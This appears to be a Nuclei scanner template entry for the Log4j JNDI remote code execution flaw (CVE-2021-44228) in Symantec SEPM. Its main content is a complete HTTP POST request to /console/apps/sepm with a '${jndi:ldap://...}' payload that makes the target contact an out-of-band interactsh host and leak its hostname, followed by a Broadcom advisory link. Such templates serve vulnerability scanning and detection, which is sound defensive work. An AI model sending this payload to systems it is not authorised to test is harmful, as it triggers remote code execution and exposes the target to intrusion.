# Nuclei Template: Symantec SEPM - Remote Code Execution (Apache Log4j)
**Template ID:** symantec-sepm-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`symantec-sepm-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Symantec SPEM is susceptible to Log4j JNDI remote code execution.

## Steps to reproduce / Exploit Payload
```http
POST /console/apps/sepm HTTP/1.1
Host: {{Hostname}}
Cookie: cookieTest=true;
Origin: {{RootURL}}
Referer: {{RootURL}}/console/apps/sepm
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded

actionString=%2Fnoupdate%2FSEPMPasswordField_{{field}}%2F&storedActions%5B%5D=%2Ftype%2FSEPMPasswordField_{{field}}%2F${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&__Action=v4&__FastSubmit=true
```

## References
- https://support.broadcom.com/security-advisory/content/security-advisories/Symantec-Security-Advisory-for-Log4j-2-CVE-2021-44228-Vulnerability/SYMSA19793
